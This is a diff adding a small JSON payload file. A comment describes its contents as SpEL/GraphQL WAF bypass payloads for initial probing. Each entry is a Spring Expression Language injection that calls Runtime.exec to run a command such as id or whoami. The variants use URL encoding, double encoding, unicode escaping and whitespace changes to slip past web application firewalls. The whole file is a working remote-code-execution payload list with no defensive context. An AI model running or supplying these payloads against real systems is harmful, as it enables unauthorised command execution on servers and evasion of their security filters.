@@ -1,0 +1,11 @@
+{
+  "_comment": "Generic SpEL/GraphQL WAF bypass payloads for initial probing.",
+  "payloads": [
+    "{\"query\": \"{{T(java.lang.Runtime).getRuntime().exec(\\\"id\\\")}}\"}",
+    "{\"query\": \"%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22id%22%29%7D%7D\"}",
+    "{\"qu\\u0065ry\": \"{{T(java.lang.Runtime).getRuntime().exec(\\\"whoami\\\")}}\"}",
+    "{\"query\": \"%257B%257BT%2528java.lang.Runtime%2529.getRuntime%2528%2529.exec%2528%2522ls%2522%2529%257D%257D\"}",
+    "{\n\t\"query\":\n\t\"{{T(java.lang.Runtime).getRuntime().exec(\\\"pwd\\\")}}\"\n}",
+    "{\"variables\": \"{{T(java.lang.Runtime).getRuntime().exec(\\\"echo test\\\")}}\"}"
+  ]
+}
